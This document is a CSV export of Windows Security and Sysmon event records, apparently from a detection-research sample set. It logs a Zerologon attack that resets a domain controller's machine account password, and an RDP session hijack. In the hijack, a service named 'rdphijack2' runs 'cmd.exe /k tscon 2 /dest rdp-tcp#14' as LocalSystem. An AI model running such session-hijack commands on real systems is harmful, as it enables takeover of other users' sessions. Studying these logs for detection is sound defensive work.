23,12158,2022-02-23 09:44:22.4519429,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E701E,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E701E""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
24,12159,2022-02-23 09:44:28.5434622,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6A5C,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
25,12160,2022-02-23 09:45:04.8135563,4742,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,A computer account was changed,NT AUTHORITY\ANONYMOUS LOGON,,Target: TEST\DC1$,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: 2022/02/23 18:45:04 AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: - DnsHostName: - ServicePrincipalNames: -,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ComputerAccountChange"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-7""},{""@Name"":""SubjectUserName"",""#text"":""ANONYMOUS LOGON""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E6""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""2022/02/23 18:45:04""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""},{""@Name"":""DnsHostName"",""#text"":""-""},{""@Name"":""ServicePrincipalNames"",""#text"":""-""}]}}"
26,12161,2022-02-23 09:45:04.8186901,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
27,12162,2022-02-23 09:45:04.8197798,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
28,12163,2022-02-23 09:45:04.8250484,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
29,12164,2022-02-23 09:45:04.8272233,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
30,12165,2022-02-23 09:45:22.4510650,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E8C31,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E8C31""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
31,12166,2022-02-23 09:45:22.4511665,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E8C31,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E8C31""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51252""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
32,12167,2022-02-23 09:45:22.4518882,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E8C31,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E8C31""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
33,12168,2022-02-23 09:46:22.4513024,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7EF5DD,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
34,12169,2022-02-23 09:46:22.4513778,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7EF5DD,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51257""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
35,12170,2022-02-23 09:46:22.4521498,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7EF5DD,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,284384,2022-02-08 20:33:10.9182672,4697,LogAlways,Microsoft-Windows-Security-Auditing,Security,596,5504,wef.windomain.local,0,,A service was installed on the system,WINDOMAIN\user,,ServiceName: rdphijack2,ServiceFileName: cmd.exe /k tscon 2 /dest rdp-tcp#14,ServiceType: Win32 Own Process,ServiceStartType: Manual,ServiceAccount: LocalSystem,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2631427795-3543736937-124197156-1112""},{""@Name"":""SubjectUserName"",""#text"":""user""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x1945C67""},{""@Name"":""ServiceName"",""#text"":""rdphijack2""},{""@Name"":""ServiceFileName"",""#text"":""cmd.exe /k tscon 2 /dest rdp-tcp#14""},{""@Name"":""ServiceType"",""#text"":""0x10""},{""@Name"":""ServiceStartType"",""#text"":""3""},{""@Name"":""ServiceAccount"",""#text"":""LocalSystem""}]}}"
2,284391,2022-02-08 20:33:15.1593875,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6292,wef.windomain.local,0,,A new process has been created,WINDOMAIN\WEF$,,Parent process: C:\Windows\System32\services.exe,PID: 0x24C,Parent PID: 0x1980,Mandatory label: SECURITY_MANDATORY_SYSTEM_RID,Target User: -\-,,C:\Windows\System32\cmd.exe cmd.exe /k tscon 2 /dest rdp-tcp#14,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WEF$""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x1980""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x24C""},{""@Name"":""CommandLine"",""#text"":""cmd.exe /k tscon 2 /dest rdp-tcp#14""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-16384""}]}}"
3,284392,2022-02-08 20:33:15.1663418,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6292,wef.windomain.local,0,,A new process has been created,WINDOMAIN\WEF$,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x1980,Parent PID: 0x1B8C,Mandatory label: SECURITY_MANDATORY_SYSTEM_RID,Target User: -\-,,C:\Windows\System32\tscon.exe tscon  2 /dest rdp-tcp#14,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WEF$""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x1B8C""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\tscon.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x1980""},{""@Name"":""CommandLine"",""#text"":""tscon  2 /dest rdp-tcp#14""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-16384""}]}}"
4,284453,2022-02-08 20:33:21.2717627,4778,LogAlways,Microsoft-Windows-Security-Auditing,Security,596,1056,wef.windomain.local,0,,RDP reconnecting,WINDOMAIN\Administrator,DESKTOP-RKEBDDR (192.168.56.1),RDP-Tcp#14,,LogonId: 0x9DEB4D,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""AccountName"",""#text"":""Administrator""},{""@Name"":""AccountDomain"",""#text"":""WINDOMAIN""},{""@Name"":""LogonID"",""#text"":""0x9DEB4D""},{""@Name"":""SessionName"",""#text"":""RDP-Tcp#14""},{""@Name"":""ClientName"",""#text"":""DESKTOP-RKEBDDR""},{""@Name"":""ClientAddress"",""#text"":""192.168.56.1""}]}}"
1,1,2022-02-23 09:37:18.7996888,16,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2164,5836,dc1.test.local,0,S-1-5-21-3684832485-3471852018-3987709081-500,ServiceConfigurationChange,,,ConfigurationFileHash: -,,,,,,C:\Users\Administrator\Desktop\Sysmon\Sysmon64.exe  -accepteula -i,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.784""},{""@Name"":""Configuration"",""#text"":""C:\\Users\\Administrator\\Desktop\\Sysmon\\Sysmon64.exe  -accepteula -i""},{""@Name"":""ConfigurationFileHash"",""#text"":""-""}]}}"
2,2,2022-02-23 09:37:18.8489399,4,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Sysmon service state changed,,,Sysmon Version 13.33,Status: Started,Timestamp: 2022-02-23 09:37:18.847,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.847""},{""@Name"":""State"",""#text"":""Started""},{""@Name"":""Version"",""#text"":""13.33""},{""@Name"":""SchemaVersion"",""#text"":""4.81""}]}}"
3,3,2022-02-23 09:37:18.8583778,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 3224, ProcessGUID: 3b58b388-004e-6216-7001-000000000500",RuleName: -,SHA256=7ABCC0EDB4C0F9F47A1BAC0D06401504E1E91C4B1A4E679F01AD539F364D6881,ParentProcess: C:\Windows\System32\services.exe,"ParentProcessID: 592, ParentProcessGUID: 3b58b388-9e10-6213-0a00-000000000500",ParentCommandLine: C:\Windows\system32\services.exe,C:\Windows\Sysmon64.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.808""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-004e-6216-7001-000000000500""},{""@Name"":""ProcessId"",""#text"":""3224""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Sysmon64.exe""},{""@Name"":""FileVersion"",""#text"":""13.33""},{""@Name"":""Description"",""#text"":""System activity monitor""},{""@Name"":""Product"",""#text"":""Sysinternals Sysmon""},{""@Name"":""Company"",""#text"":""Sysinternals - www.sysinternals.com""},{""@Name"":""OriginalFileName"",""#text"":""-""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Sysmon64.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=7ABCC0EDB4C0F9F47A1BAC0D06401504E1E91C4B1A4E679F01AD539F364D6881""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e10-6213-0a00-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""592""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\services.exe""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
4,4,2022-02-23 09:37:18.8588631,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 608, ProcessGUID: 3b58b388-004e-6216-7101-000000000500",RuleName: -,SHA256=1D61DD5E920F13D3280B8FFC40BB0C6164D29CAF2220BF526933177D050FC379,ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 784, ParentProcessGUID: 3b58b388-9e11-6213-0c00-000000000500",ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\system32\wbem\unsecapp.exe -Embedding,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:18.831""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-004e-6216-7101-000000000500""},{""@Name"":""ProcessId"",""#text"":""608""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\wbem\\unsecapp.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.14393.0 (rs1_release.160715-1616)""},{""@Name"":""Description"",""#text"":""Sink to receive asynchronous callbacks for WMI client application""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""unsecapp.dll""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""3b58b388-9e10-6213-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA256=1D61DD5E920F13D3280B8FFC40BB0C6164D29CAF2220BF526933177D050FC379""},{""@Name"":""ParentProcessGuid"",""#text"":""3b58b388-9e11-6213-0c00-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""784""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k DcomLaunch""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
5,5,2022-02-23 09:37:19.8344385,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 2164, ProcessGUID: 3b58b388-004e-6216-6a01-000000000500",,,,,,C:\Users\Administrator\Desktop\Sysmon\Sysmon64.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:37:19.831""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-004e-6216-6a01-000000000500""},{""@Name"":""ProcessId"",""#text"":""2164""},{""@Name"":""Image"",""#text"":""C:\\Users\\Administrator\\Desktop\\Sysmon\\Sysmon64.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
